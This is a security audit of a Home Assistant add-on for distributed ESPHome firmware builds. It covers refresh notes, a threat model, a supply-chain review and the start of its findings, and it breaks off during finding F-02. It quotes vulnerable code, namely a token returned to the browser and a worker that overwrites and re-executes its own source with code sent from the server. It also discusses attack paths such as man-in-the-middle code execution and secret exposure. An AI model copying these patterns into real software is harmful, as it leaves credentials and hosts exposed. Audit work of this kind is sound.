# Security Audit: Fleet for ESPHome

**Original audit:** 2026-03-29 (version 0.0.21; at the time of audit the product was called "ESPHome Distributed Build Server"; renamed to "ESPHome Fleet" in 1.4.1, renumbered to 1.5.0 late cycle; renamed to "Fleet for ESPHome" in 1.7.1). <!-- br1-allow: rebrand chronology -->
**Last refreshed:** 2026-07-17 against 1.7.2.
**Scope:** Server add-on (`ha-addon/server/`), Dockerfile, `run.sh`, `config.yaml`, and the bundled worker (`client/client.py`) as it interacts with the server security model.

> **Refresh note (2026-07-17, 1.7.2):** No F-* status flips this cycle — 1.7.2 shipped no security-tier workitems (SC/SA/AU). Three security-relevant deltas worth recording:
>
> - **Docker base image moved Python 3.11 → 3.13 (F-13).** ESPHome 2026.7.0 dropped Python 3.11, so the server + worker images rebased from `python:3.11-slim` to `python:3.13-slim`, digests re-pinned in lockstep (worker Dockerfile fully; server `ARG BUILD_FROM` default). F-13's posture is unchanged — still **FIXED (partial)**: the Supervisor-driven `build.yaml` path still can't carry a `@sha256:` digest. The `requirements.lock` files were regenerated under 3.13 with `--generate-hashes` (PY-8/PY-9 clean; no package-version churn, so no new transitive attack surface).
> - **`libusb-1.0-0` added to the runtime image apt layer.** 2026.7's native ESP-IDF toolchain runs `openocd` (which links `libusb-1.0.so.0`) during framework install. Adds one Debian system library to the image; installed unversioned like the existing `gcc`/`git`/`libffi-dev`/`libssl-dev` set, so it inherits the same F-13 "apt packages not digest-pinned" caveat — no new finding, same posture.
> - **Two high-severity npm dev-dependency alerts cleared.** Dependabot flagged `vite` (<8.0.16, `server.fs.deny` bypass) and `hono` (<4.12.25, CORS wildcard-with-credentials); both are build/dev-only tooling not shipped to users. Bumped to patched versions (vite 8.1.5, hono override 4.12.30); `npm audit --audit-level=high --omit=dev` is clean. No runtime code path was exposed (neither ships in the served bundle's request-handling surface).
>
> **Refresh note (2026-05-09, 1.7.1):** No F-* status flips this cycle. 1.7.1 is a brand-refresh release — *"ESPHome Fleet"* (1.5.0–1.7.0) renamed to **Fleet for ESPHome** — paired with new artwork, the [home-assistant/brands#10279](https://github.com/home-assistant/brands/pull/10279) PR, and a stack of community-reported bug fixes (#127, #131, #135, #136, #232, #234, #235, #236, #238, plus #231). Verified pre-flip in BR.1 sub-bullet 12: the rename is metadata-only at the network/auth layer — code identifiers (add-on slug `esphome_dist_server`, integration domain `esphome_fleet`, GHCR image names, mDNS service type `_esphome-fleet._tcp.local.`, Bearer-realm consumers) all keep their existing forms, no migration on existing installs. <!-- br1-allow: rebrand chronology --> Items worth surfacing for audit visibility even though none flip an F-* finding:
>
> - **Legacy full-config-dir bundle path (#131).** `scanner.create_bundle` now branches on the *server's* installed ESPHome version: ≥2026.4 keeps the validated, target-scoped `ConfigBundleCreator` subprocess; <2026.4 falls back to `_create_legacy_bundle`, a deterministic tar of the entire `/config/esphome/` directory minus `.esphome` / `.pioenvs` / `.pio` / `.git` / `__pycache__` / mac dotfiles. Trade-off documented inline at `scanner.py:454-466`, on the version-dropdown UI, and in the 1.7.1 changelog: the legacy path ships every device's `secrets.yaml` and every other device's YAML to the worker that claims the job. Consistent with the trusted-workers threat model (§3); users sharing workers with untrusted parties should pin ≥2026.4 so bundles stay scoped. Per-job ESPHome version selection is independent of the server's bundling version (the server's *active* venv decides bundle shape; the *job*'s pinned version decides what the worker compiles with), so an operator who keeps the server on 2026.4+ retains the scoped bundle even when individual targets compile against older releases.
> - **`device_native_api_poll` opt-in (#238), default OFF.** Pre-1.7.1 the add-on opened a fresh `aioesphomeapi` connection to every known device every 60 s to harvest `running_version` / `compilation_time` / `mac_address`. The new default reads steady-state liveness from mDNS announcements (which already carry `version` in the TXT record) and only opens an API connection on first sight of a new device or right after a Fleet-driven OTA. Reduces the add-on's egress footprint inside the LAN by ~60× — on a 50-device fleet, from one connect/min/device to roughly two connects per device per OTA cycle. Power users diagnosing a flaky device can flip the setting back on. Defensive; no F-entry change.
> - **Worker eligibility-check error handling (#234).** `GET /api/v1/jobs/next` used to bubble a `TypeError` to HTTP 500 when a freshly-registered worker's `perf_score` / benchmark fields were `None`. The handler now wraps the per-worker eligibility check in a try/except that logs the traceback at WARNING with the worker's `client_id` and falls through to HTTP 204 ("no job for you right now"). Closes a DoS-by-stupidity loop where a single misformatted worker would lock-loop the server with 500s while never claiming a job. Same trust tier (worker tokens still required), defensive only.
> - **Server-side firmware-upload grace window (#236).** Variant uploads (`POST /api/v1/jobs/{id}/firmware/{variant}`) now accept a 60-second grace past `finished_at` *for the still-assigned worker only* — other workers' uploads on a finished job continue to be rejected via `client_id` lookup. Logged at INFO so the path is observable in the add-on log. Closes a race where the server's timeout-checker flipped a job to FAILED mid-upload of factory + ota variants on slow workers; the OTA had already succeeded, but the UI showed FAILED. Not a trust-boundary change.
> - **Dependabot alerts at release time.** Two open HIGH alerts on `fast-uri` (#10 / #14) — transitive of the *dev-only* `shadcn` CLI → `@modelcontextprotocol/sdk` → `ajv`. Never reaches production bundles (Vite-built UI does not import shadcn at runtime), and the upstream advisories list `first_patched_version: null` so there is nothing to upgrade to. Tracked as `fast-uri-DEV` WONTFIX in `dev-plans/archive/WORKITEMS-1.7.1.md`; re-evaluate next release.
>
> No F-* status flips because none of these change a trust assumption or move a finding's residual risk; documented for auditability of the new attack surface.

> **Refresh note (2026-05-02, 1.7.0):** No F-* status flips this cycle. 1.7.0 is a feature release (TG.* fleet tags + routing rules, DQ.* worker disk quota, DM.* device-management polish, RC.1 rendered-config view) plus a stack of compile-pipeline hardening (#111 bundle-creation race, #112 bundle-log scrub, #197/PY-11 git-clean invariant, #214/#220 worker self-heal of corrupted PlatformIO toolchains). Items worth surfacing for the audit even though none of them flip an F-* finding:
>
> - **`NET_RAW` capability added** (`config.yaml` `privileged: [NET_RAW]`) for the new ICMP ping diagnostic (DM.2 / bug #206). The endpoint at `POST /ui/api/targets/{filename}/ping` tries unprivileged datagram ICMP first and only falls back to raw-socket ICMP on installs where `net.ipv4.ping_group_range` is empty (HAOS default). The capability is the only non-default Linux capability the add-on holds; the endpoint accepts no arbitrary host (only the configured target's resolved OTA address), is `count=10, interval=0.2 s, timeout=2 s` rate-bounded by ICMP, and lives under `/ui/api/*` (HA-Ingress / `require_ha_auth` Bearer-gated). Threat model §1 (browser is trusted) accepts that any UI user can trigger an ICMP burst at the configured target; Pat at home-lab scale has no DoS budget.
> - **Server-wide bundle-creation lock** (#111, `scanner.create_bundle_async` wraps `loop.run_in_executor` behind a module-level `asyncio.Lock`). Closes a real race that surfaced as five different misleading errors out of seven concurrent kauf-plug-* claims sharing the same `external_components` git repo. Not a security finding (no trust-boundary crossing), but the race could leak intermediate-extraction state from one job into another's captured build log; the lock makes that impossible by construction.
> - **Bundle-failure log scrubbed of ESPHome logger chatter** (#112). Captured stderr from the bundle subprocess used to be decorated with INFO/WARNING lines from ESPHome's `_LOGGER` (deprecation warnings, the upstream `2026.4.3` false-positive `Including a single package under \`packages:\` is deprecated`, etc.). 1.7.0 silences `_LOGGER` inside the subprocess so only our explicit stderr writes — and uncaught Python tracebacks — reach the Queue Log modal. Defensive: the noise wasn't sensitive but it concealed real diagnostics.
> - **Rendered-config endpoint never logs body** (RC.1, `GET /ui/api/targets/{filename}/rendered-config`). Output contains plaintext `!secret` substitutions; the handler logs only `rendered config bytes=NN`. Regression test `tests/test_rendered_config.py::test_rendered_config_logs_do_not_leak_output` pins the contract. Server-side ANSI strip on stdout/stderr prevents Monaco from rendering raw escape codes that would otherwise leak conceal-wrapped `secret:`/`key:`/`psk:` values into the visible YAML.
> - **PY-11 invariant** (#197) — every UI-driven file mutation under `/config/esphome/` must leave `git status --porcelain` empty after `drain_pending_commits()` returns. Closes a class of bugs (#94, #197) where an `os.unlink` or `git mv` left a dangling staged half-commit that the next user save swept into the wrong commit, producing inaccurate rollback diffs. Backed by a 12-scenario regression test (`tests/test_git_clean_after_ops.py`).
> - **Firmware retention + `backup_exclude` (#198/#199).** `firmware_retention_days` Settings field (default 2) bounds how long compile binaries linger on disk; `firmware/` added to `backup_exclude` so a HA snapshot no longer carries 200+ MB of regenerable .bin files. Reduces the data-exposure footprint on a stolen / leaked HA backup tarball.
> - **Tags + routing-rule endpoints (TG.*) and disk-quota endpoint (DQ.5).** All under `/ui/api/*` — same auth tier, no new tokens, no new privileges. Wire-protocol additions (`RegisterRequest.disk_quota_bytes`, `HeartbeatResponse.set_disk_quota_bytes`, `SystemInfo.{disk_usage_bytes,disk_quota_bytes,last_eviction_freed_bytes}`) are additive optional fields with no `PROTOCOL_VERSION` bump (backward-compatible — old workers register without these and the server falls back to env-var defaults).
> - **Worker self-pause on disk full (#219).** Hysteresis-bounded (enter at 95 %, exit at 90 %) — when a worker's heartbeat reports disk over the entry threshold, the server returns 204 on its claim attempts and the deferral pool excludes it. Prevents a no-space-left-on-device worker from claiming and immediately failing every job in the queue. Defensive; closes a denial-of-service-by-stupidity hole that was tractable in the home lab on 50-GB-rootfs Proxmox VMs.
> - **CI compile-test matrix doubled** (CI.3) — the pinned `MIN_ESPHOME_VERSION` floor + latest stable both compile across 16 fixture YAMLs per platform/framework. Catches upstream API regressions at either edge as a single red square.
>
> No F-* status flips because none of these change a trust assumption or move a finding's residual risk; they are documented for auditability of the new attack surface.

> **Refresh note (2026-04-24, 1.6.2):** No F-* status flips this cycle. 1.6.2 is a hardening release focused on install-path correctness (bugs #82, #83, #84, #86, #104, #105, #190), worker-bundle discipline (BD.1), and honest framing of already-shipped security claims (TP.1 AppArmor permissive-caveat, TP.2 AppArmor narrow denies verified, TP.3 quality-scale retreat silver → bronze, TP.4 CHANGELOG retrospective). None of these open, widen, or close a finding in this audit.
>
> Minor notes that do NOT require an F-entry change:
> - **py-spy round-trip (#108 added, #189 removed, net-zero):** the "Request diagnostics" feature briefly shipped a `py-spy` dependency in the add-on + client images (image 7 → 8). It was removed in #189 in favour of a pure-Python in-process thread walk via `sys._current_frames()` because Supervisor drops `CAP_SYS_PTRACE` on add-on containers and the sidecar workaround from `scripts/threaddump-addon.sh` is rejected on HAOS + HA Supervised variants. `IMAGE_VERSION` + `MIN_IMAGE_VERSION` were reverted 8 → 7 (image content is byte-identical to pre-#108), so 1.6.1 workers and briefly-1.6.2 workers are both accepted by the stale-image check. No syscall capability, ptrace, or external profiler is in the final 1.6.2 path. Net effect on the threat model: nil.
> - **`ptrace,` allow rule stayed denied:** the AppArmor profile's `deny ptrace,` rule from 1.6.1 was considered for a same-profile carve-out during #108 and reverted in the same turn — the carve-out didn't enable anything (py-spy still failed due to Supervisor dropping `CAP_SYS_PTRACE`, which is the binding constraint, not AppArmor). §F-21's caveat is unchanged.
> - **`docker-compose.yml` + standalone `Dockerfile.standalone`:** bug #104 added missing `git` + `iputils-ping` to the standalone apt layer to match the add-on layer. Pure feature parity; no new surface.

> **Refresh note (2026-04-20, 1.6.1):** Status flips this cycle:
> - **F-13** (Docker base not digest-pinned) moved OPEN → **FIXED (partial)** via SS.4. Worker Dockerfile pins `python:3.13-slim@sha256:…` fully; server Dockerfile pins the `ARG BUILD_FROM` default digest. The Supervisor-driven production path via `build.yaml` still can't carry a digest (upstream regex rejects `@sha256:…` there) — partial rather than full FIXED for that reason. See §F-13.
> - **F-18** moved FIXED (partial) → **WONTFIX**. The SC.3 constraints-file defense was removed in 1.6.1 after a re-assessment: the single committed `esphome-constraints/<version>.txt` (we only ever shipped one version at a time) rarely matched the ESPHome version actually requested at job time — users pinned older versions or tracked newer releases than the weekly regen workflow had time to produce, so the hardened `--require-hashes` path's hit rate in practice was ~0% and the documented fallback-to-unpinned-install branch was the load-bearing case. The defense wasn't defending anything; it was generating weekly Dependabot noise and ~1500 lines of churning lockfile per committed ESPHome release with no security benefit. Accepted within the trusted-workers threat model; see the rewritten §F-18 for the reasoning. `esphome-constraints/`, `scripts/regen-esphome-constraints.sh`, and `.github/workflows/regen-esphome-constraints.yml` all deleted; `version_manager._install()` simplified to a plain `pip install esphome==<version>`.
> - **New F-21 added and immediately FIXED** — the add-on previously ran unconfined under Supervisor (no `apparmor:` declaration). SS.1 ships a first-pass AppArmor profile (`ha-addon/apparmor.txt`) plus `apparmor: true` in `config.yaml`; Supervisor loads the profile on install/upgrade, the add-on runs under confinement, and the security-star card flips. First-pass profile is deliberately permissive (explicit rules for `file,`, `capability,`, `network,`, `signal,`, `dbus,`, `unix,`, `mount,`, `pivot_root,`, `ptrace,`) — attempts to tighten with path-level allows tripped on stock `abstractions/python` missing the slim-base libpython and a deny-scope rule breaking PlatformIO's `penv` bootstrap during compile. Attached-and-permissive is strictly better than unconfined; tightening is tracked against observed denial telemetry. See §F-21.
> - **Non-finding documentation** — SS.3 added a "Why this add-on requests these permissions" block to `DOCS.md` giving each non-default `config.yaml` flag (`host_network`, `hassio_api`, `homeassistant_api`, `auth_api`, `config:rw`) a concise rationale. Not a finding per se (each flag is load-bearing), but reduces the "elevated-permissions but no explanation" friction on the Supervisor store page.
> - **dompurify advisory chain** — six open Dependabot alerts (5× `dompurify`, 1× `hono`) were resolved for the 1.6.1 ship. dompurify pinned to a patched version via `package.json` overrides; `shadcn` moved to devDependencies so `hono` no longer ships in the production bundle. No F-entry change — these were moderate-severity advisories, not findings from the audit.

> **Refresh note (2026-04-19, 1.6.0):** No new security workitems this cycle. The 1.6 release is feature-focused (config versioning, job history, in-app Settings drawer) and didn't alter the server's auth model, token handling, or trust boundaries. All 1.5.0-era mitigations (SC.1, SA.1/SA.2, AU.1) remain in place and are re-verified by the same invariants and tests that gate CI. Finding statuses from the 2026-04-16 refresh carry forward unchanged — `grep -nE '^- \[x\] \*\*(SC|SA|AU)\.[0-9]' dev-plans/WORKITEMS-1.6.md` returns empty.
>
> Note on new attack surface: the auto-versioning (AV.*) feature shells out to `git` with a fixed config directory and hash-validated arguments (`_run` helper + 4–40 hex regex for every hash input), so the new code doesn't widen the argv injection surface. Archive-restore + delete go through the same helper. Job history DAO uses parameterised SQLite queries (no string-formatted SQL anywhere in `job_history.py`), so the new `/ui/api/history` query endpoints don't open a SQLi vector. Settings PATCH validator is per-field and rejects unknown keys (same shape as 1.5) — the new `versioning_enabled: 'on'/'off'/'unset'` and `time_format: 'auto'/'12h'/'24h'` enums are whitelist-checked.
>
> **Refresh note (2026-04-16):** Walk-through with the project owner against current code. Status flips in this refresh:
> - **F-06, F-07, F-08, F-17** moved OPEN/PARTIAL → **WONTFIX** — each is by-design for the documented home-network threat model (see new Threat Model section below). The code isn't changing; this is the audit catching up to the decisions.
> - **F-11** moved WONTFIX → **INFO** — build logs contain values the server already has (it distributed them in `secrets.yaml` via the job bundle); logging them back doesn't cross a trust boundary. Not a finding.
> - **F-14** and **F-15** moved OPEN → **FIXED (1.5.0-dev.77)** via SA.2 and SA.1 respectively — token file chmod + `X-Ingress-Path` sanitizer both shipped in the same dev cycle.
> - **F-19** confirmed **FIXED** in 1.4.1 via SC.1 (SHA-pinned Actions + `check-invariants.sh` rule).
> - **F-18** was **FIXED (partial)** in 1.5.0 via SC.3 — worker installs consulted a hash-pinned constraints file per ESPHome version. This was later re-assessed and removed in 1.6.1; see the 2026-04-20 refresh note above and §F-18 below.
>
> New **Threat Model** section added immediately below the executive summary to make the deployment assumptions explicit — F-01/F-02/F-04/F-05/F-06/F-07/F-08/F-17 all trace back to it.

---

## Executive Summary

Fleet for ESPHome is a Home Assistant add-on that coordinates remote firmware compilation. Its threat model is deliberately relaxed: it runs on a trusted home network, behind Home Assistant's ingress authentication for the browser UI, and uses a shared secret token for build workers. Within that context, the implementation is generally sound — the code is clean, intentional, and most of the obvious risks are already mitigated.

However, several meaningful security issues remain. The most significant are:

1. **The server token is transmitted to any browser that opens the UI** (HIGH). The `/ui/api/server-info` endpoint returns the raw auth token, which is then embedded in the "Connect Worker" docker command shown to the user. This deliberately exposes the credential to the browser, but it also means any network observer or compromised browser extension obtains a fully working API credential.

2. **The worker auto-update mechanism executes arbitrary code delivered by the server** (HIGH). Build workers automatically download Python source files from the server and replace their own code on disk, then exec themselves. A server compromise — or a man-in-the-middle against plaintext HTTP — results in arbitrary code execution on every connected build machine.

3. **The UI API has no authentication** (MEDIUM in context, would be HIGH outside HA). All `/ui/api/*` endpoints rely entirely on HA Ingress to enforce authentication. If the add-on port (8765) is reachable directly without going through HA, anyone can enqueue builds, read logs (including secrets), edit YAML configs, and remove workers with no credentials at all.

4. **`secrets.yaml` is included in every build bundle** sent to workers (MEDIUM). Every build worker receives a full tarball of the ESPHome config directory, including `secrets.yaml`, which typically contains Wi-Fi passwords, API keys, and OTA passwords.

5. **Unbounded queue growth** enables denial of service (LOW/MEDIUM) from any authenticated worker.

The findings below are detailed with affected code locations and concrete recommendations.

---

## Threat Model

**Deployment assumption.** Fleet for ESPHome is deployed as a Home Assistant add-on on a **trusted home LAN**. The server, all build workers, the Home Assistant instance, and the ESP32/ESP8266 devices all share this LAN. The design deliberately optimizes for **operator convenience** over hardening against a LAN-local adversary. This is the same trust posture as Home Assistant itself, Node-RED, Frigate, Zigbee2MQTT, and the other canonical HA add-ons: if an attacker is already inside your LAN, the compromise budget for "my home-automation firmware server" is already spent.

Explicit trust assumptions that this audit treats as accepted risk:

1. **The browser is trusted.** Anyone who can open the UI (i.e. has HA credentials and is on the network) is authorized to do everything the UI allows. The UI deliberately exposes the shared worker bearer token to the browser so the Connect Worker modal can render a ready-to-paste `docker run` command (**F-01**). Risk: the token is now readable by any extension or devtools user in the same browser. Accepted.
2. **The LAN is trusted.** Server ↔ worker traffic is plaintext HTTP (**F-05**). Users who want to run a worker across network segments (over a VPN, across a WAN) are expected to front the server with their own reverse proxy for TLS — documented behaviour.
3. **Every connected worker is trusted.** Workers authenticate with a shared bearer token; once authenticated, a worker can register, claim any job, submit any result (**F-08**), read full build bundles including `secrets.yaml` (**F-04**), and — because YAML can reference `external_components` / `includes` / `libraries` — execute Python sourced from external git repositories during compile (**F-17**). A compromised worker is a compromised fleet. The ESPHome ecosystem's YAML-driven code-loading semantics make this unavoidable without giving up core features users rely on.
4. **The HA Supervisor is trusted.** The bundled `172.30.32.2` IP bypass on `/api/v1/*` (**F-06**) is the standard HA add-on pattern — any process with access to the Docker bridge network the Supervisor lives on can call the worker API without a token. Accepted because that network is Supervisor-controlled.
5. **Anyone with UI access is trusted to edit configs.** The UI API has **no rate limiting** (**F-07**) and **no job-result-authorship check** beyond "are you a registered worker" (**F-08**). Per the home-lab scale (one or two concurrent operators), these are acceptable.
6. **Build logs are not secrets-safe** (**F-11**) — but this is a property of the ESPHome build system, not a trust-boundary crossing. Logs contain values (WiFi passwords, API keys) that the server itself distributed to the worker in `secrets.yaml`. Returning them to the server that already has them doesn't leak anything new.

**What the threat model does NOT accept:**

- **External adversaries** reaching the add-on from the Internet — by design the add-on is LAN-only; users who expose port 8765 to the Internet are explicitly out-of-scope (we document this in `ha-addon/DOCS.md`).
- **Direct-port access bypassing HA Ingress** — closed in 1.5 via mandatory `require_ha_auth` (AU.1–AU.7 / **F-03**). Direct port 8765 requests require a valid Bearer — either the add-on's shared worker token (used automatically by the native HA integration) or a Home Assistant long-lived access token.
- **Supply-chain compromise** of the add-on itself — covered by the Supply Chain Threat Model below: hash-pinned lockfiles (**F-12**), SHA-pinned GitHub Actions (**F-19**), cosign-signed GHCR images, `pip-audit` + `npm audit` CI gates, PY-7/PY-8 invariants.
- **Tampering with worker updates at the image layer** — workers update via `docker pull` of cosign-signed GHCR images. Source-code auto-update (**F-02**) was temporarily disabled in 1.4.1-dev.60 and restored in dev.62 (bug #58); the threat model treats the shared bearer token as the trust boundary there (a compromised token = full fleet compromise either way).
- **Tampering with the ESPHome package at `pip install` time on workers** (**F-18**) — **WONTFIX as of 1.6.1** within the trusted-workers threat model. SC.3 shipped in 1.5.0 as a partial fix (committed hash-pinned constraints file per ESPHome version, weekly regen workflow) but was removed in 1.6.1 after six months showed the defense rarely applied — the single committed version was almost never the version a worker actually installed at job time, and the documented "unpinned fallback + WARNING" path was the load-bearing case. Workers are already trusted for `external_components` / `includes` / `libraries:` Python execution (F-02 / F-04 / F-17 WONTFIX), so pinning just the ESPHome wheel while leaving plugin-Python wide open was security theater. See F-18 for the full re-assessment.

**What this means for the findings below.** F-01 / F-02 / F-04 / F-05 / F-06 / F-07 / F-08 / F-11 / F-13 / F-16 / F-17 / F-18 are all accepted per this threat model and marked **WONTFIX** (or INFO). Their presence in this document is documentation, not backlog. F-03 / F-09 / F-10 / F-12 / F-14 / F-15 / F-19 / F-20 are **FIXED**. No open findings remain.

---

### Post-audit mitigations (shipped since the original audit)

**1.3.1 (supply-chain + hardening pass, Workstream E):**
- **Hash-pinned Python dependencies** — both `ha-addon/server/requirements.lock` and `ha-addon/client/requirements.lock` generated with `pip-compile --generate-hashes --strip-extras`. Dockerfiles install via `pip install --require-hashes -r requirements.lock`. Closes F-12 at image-build time. `scripts/refresh-deps.sh` regenerates both lockfiles.
- **CI audit gates** — `pip-audit --requirement <lockfile>` runs in CI for both server and client on every push; `npm audit --audit-level=high --omit=dev` gates the frontend job. Hard failures; any known high/critical advisory blocks merge unless explicitly ignored (see PY-7 below).
- **Dependabot** — weekly PRs for pip × 2 (server + client), npm × 1 (UI), docker × 2, and github-actions × 1. Open-PR caps kept low to avoid queue pileup.
- **Cosign-signed GHCR images (keyless / GitHub OIDC)** — both `publish-client.yml` and `publish-server.yml` sign every published tag against the build's digest using `sigstore/cosign-installer@v3` + `cosign sign --yes`. No long-lived keys. Verification instructions in `ha-addon/DOCS.md`. Closes "item 9" (unsigned images) from the supply-chain threat model.
- **Security response headers middleware** — `security_headers_middleware` in `main.py` adds `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy`, and `X-Frame-Options: SAMEORIGIN` to every response **except** `/api/v1/*` (worker tier). CSP allows `wss:` (live log WS), `https://schema.esphome.io` (editor schema), `blob:` workers (Monaco), and `frame-ancestors 'self'` (HA Ingress iframe). Inner-handler headers are not clobbered. Closes F-20.
- **Typed protocol (pydantic v2)** — every `/api/v1/*` handler parses its body through a typed pydantic model in `protocol.py` (byte-identical server/client copies enforced by `tests/test_protocol.py`). Malformed payloads return structured `ProtocolError` responses with HTTP 400 instead of half-processing. `PROTOCOL_VERSION` gate rejects mismatched peers with a clear error. Reduces the injection surface on the worker API (OWASP A03).
- **Auth middleware observability (C.2)** — every 401 emits a structured reason (`missing_authorization_header`, `authorization_not_bearer_scheme`, `bearer_token_mismatch`) plus the peer IP at WARNING. IPv6 zone IDs stripped, IPv4-mapped IPv6 unwrapped. `peername=None` paths no longer crash. Addresses A09 logging gap and F-06 operational observability.
- **Log payload DoS guard (C.3)** — `append_job_log` handler rejects bodies larger than `4 × MAX_LOG_BYTES` (~2MB) with `log_payload_too_large` + HTTP 413 before aiohttp buffers the full input. Augments the existing in-function log cap. Partially addresses F-07.
- **PY-6 invariant** — `protocol.py` bytes must stay identical between server and client copies (enforced by unit test). Prevents wire-contract drift.
- **PY-7 invariant** — every `--ignore-vuln` in `pip-audit` must have an inline applicability assessment: why the fix can't be pulled in, whether the vulnerable code path is actually exercised in this codebase, and a date so staleness is visible. Prevents silent CVE dismissals.
- **PY-8 invariant** — every direct dep in `requirements.txt` must also appear in `requirements.lock`. Enforced by `scripts/check-invariants.sh`. Prevents the 1.3.1-dev.2 class of bug where `croniter` was silently absent from the Docker image because `refresh-deps.sh` wasn't rerun.

**1.4.1 (server-performance + rebrand):**
- **Compression middleware scope** — gzip is applied only to `/ui/api/*` responses (not `/api/v1/*` worker-tier), so the 46 MB config-bundle tarball sent to workers doesn't block the event loop gzipping it synchronously. Not a security fix per se but prevents a latent DoS via the event-loop stall.

**Deliberately accepted** (see summary table for status):
- F-18 (worker pip install not hash-pinned) — **WONTFIX as of 1.6.1** within the trusted-workers threat model. SC.3 shipped in 1.5.0 as a partial fix and was removed in 1.6.1 after a re-assessment: the single committed constraints file rarely matched the version a worker actually installed, so the hardened path's hit rate in practice was ~0% and the unpinned fallback was load-bearing. Workers are already trusted for `external_components` / `includes` / `libraries:` Python execution, so pinning just the ESPHome wheel while leaving plugin-Python wide open was security theater. See F-18 for the full re-assessment.

(F-02 / F-08 / F-17 accepted per threat model in the 2026-04-16 refresh. F-14 / F-15 / F-19 all shipped fixes in the 1.4.1–1.5 cycle — see summary table for release tags.)

---

## Supply Chain Threat Model

This section covers supply-chain surface **introduced or amplified by this project**. Generic ESPHome-ecosystem trust assumptions (the PlatformIO registry, framework SDKs, ESPHome's own `external_components` / `includes` / `libraries` feature) are inherited from any ESPHome install and are not re-litigated here.

In priority order:

1. **Worker installs `esphome==<version>` from PyPI at job time.** `ha-addon/client/version_manager.py:137` shells out to `pip install --no-cache-dir esphome==<version>` with no `--require-hashes`, no index restriction, and no constraint file. The version string is chosen by the worker based on the target YAML's `esphome.esphome_version` (or the server's recommendation). A compromised ESPHome release — or any of its several-hundred transitive dependencies — executes arbitrary Python on every worker the next time it compiles a target pinned to that version. This is strictly worse than F-02 (the server-driven source auto-update) because it does not require the server to be compromised at all: it only requires *any* package in ESPHome's dependency graph to have a bad release. There is no allow-list, no hash manifest, and no signed-build verification.

2. **`python:3.13-slim` base image and apt packages are not digest-pinned.** Both `ha-addon/Dockerfile` and `ha-addon/client/Dockerfile` use `FROM python:3.13-slim` (tag, not digest) and `apt-get install -y gcc libffi-dev libssl-dev git iputils-ping libusb-1.0-0` without version constraints. Each rebuild resolves the latest published layer from Docker Hub and the latest apt snapshot from Debian. This is partially constrained by HA's add-on build infrastructure on the server side but fully unconstrained on the client image we publish ourselves. Tracked as F-13 (and extended here).

3. **GitHub Actions are referenced by floating tags** (`actions/checkout@v4`, `actions/setup-python@v5`, `actions/setup-node@v4`, `actions/upload-artifact@v4`) in every workflow file. A tag-move attack on any of these — or a compromise of a transitively-used action — pushes attacker code into our CI with full access to repo secrets and the GHCR publish token. Tracked as F-19.

4. **Python requirements use `>=` constraints** with no lockfile, no `--require-hashes`, and no `pip-audit` in CI. Both `ha-addon/server/requirements.txt` and `ha-addon/client/requirements.txt`. Tracked as F-12.

5. **Frontend npm has `package-lock.json`** (which does lock hashes transitively, so this is meaningfully better than the Python side), but `package.json` uses `^` ranges, there is no `npm audit` gate in CI, and no advisory feed is consulted before release.

6. **Server distributes worker source code via `/api/v1/client/code`** and workers execv themselves into it (F-02 chain). The supply-chain relevance is that this pathway bypasses any Docker-image signing or provenance we might add later — fixing upstream build provenance without also fixing F-02 leaves the bypass in place.

7. **No SBOM is generated for either Docker image**, and GHCR images are not signed (no cosign attestations, no provenance). Downstream users have no way to verify what they're running matches this source tree.

**Mitigation state (as of 1.4.1-dev):**
- Item 1 (worker pip install) — **WONTFIX as of 1.6.1** within the trusted-workers threat model. Image-build dependencies remain hash-pinned (F-12 closed); worker-time `pip install esphome==<version>` runs unpinned. SC.3's committed constraints file was removed in 1.6.1 after six months of data showed it rarely matched the version actually requested. See F-18 for the full re-assessment.
- Item 2 (base image not digest-pinned) — WONTFIX. HA add-on build infrastructure controls BUILD_FROM.
- Item 3 (GitHub Actions floating tags) — partial. Dependabot now opens weekly PRs for major-version bumps, but the actions themselves are still referenced by major tag, not SHA. F-19 remains open.
- Item 4 (Python requirements unpinned) — **closed**. Lockfiles with `--require-hashes` + `pip-audit` in CI + Dependabot + PY-8 invariant. F-12 resolved.
- Item 5 (npm audit not in CI) — **closed**. `npm audit --audit-level=high --omit=dev` runs in the frontend CI job.
- Item 6 (worker source via `/api/v1/client/code`) — unchanged. F-02 still open; image-version gating (`IMAGE_VERSION`/`MIN_IMAGE_VERSION`) landed in 1.3.0 narrowed the blast radius to workers on a current Docker image, but no signature verification yet.
- Item 7 (no SBOM, no signing) — **closed for signing**. All GHCR tags are cosign-signed via keyless GitHub OIDC (E.10). SBOM generation still deferred (E.7 in the 1.3.1 plan, not blocking).

---

## Risk Rating Scale

| Rating   | Meaning |
|----------|---------|
| Critical | Can be exploited to compromise the host system or HA instance without any credentials |
| High     | Significant impact, exploitable by a network-adjacent attacker or with minimal access |
| Medium   | Real impact but requires either local access, existing credentials, or a specific attack chain |
| Low      | Minor hardening issues or defence-in-depth gaps |
| Info     | Observations and best-practice notes with negligible direct risk |

---

## Findings

### F-01 — Auth Token Exposed to Browser via `/ui/api/server-info`

**Severity:** HIGH

**Description:**

`ui_api.py` line 32 returns `cfg.token` directly in the JSON response to the browser:

```python
return web.json_response({
    "token": cfg.token,
    "port": cfg.port,
    ...
})
```

The browser uses this to render a pre-filled `docker run` command in the "Connect Worker" modal. This is convenient UX, but the consequence is that:

- The raw Bearer token is stored in JavaScript memory and accessible to any script running in the same browser origin.
- Any browser extension with broad permissions, XSS injection, or JavaScript console access can read the token.
- The token is also readable by any browser developer who opens DevTools → Network while the UI is open.
- The token is transmitted over plaintext HTTP from the add-on to the browser (see F-05).

The token grants full access to all `/api/v1/*` endpoints: register workers, claim jobs, submit results, and read build logs.

**Affected code:** `ui_api.py:32` (`get_server_info`), `static/index.html:706-714` (`renderDockerCmd`)

**Recommended fix:**

Do not return the full token to the browser. Instead, serve the docker command server-side (as a pre-rendered string), masking everything except the last 4 characters for visual confirmation. Alternatively, provide a dedicated "copy token" flow that requires a deliberate user action and does not store the token in global JavaScript state. At minimum, consider returning only a token prefix for display purposes.

---

### F-02 — Worker Auto-Update Executes Arbitrary Python Code from Server

**Severity:** HIGH

**Description:**

`client/client.py` lines 495–516 implement an auto-update mechanism. When the server reports a newer worker version, the worker downloads all `.py` files from `/api/v1/client/code` and writes them directly over its own source files, then calls `os.execv` to restart itself:

```python
for filename, content in files.items():
    if not filename.endswith(".py"):
        continue
    target = (client_dir / filename).resolve()
    if target.parent != client_dir:
        logger.warning("Skipping suspicious path in update: %s", filename)
        continue
    target.write_text(content, encoding="utf-8")
```

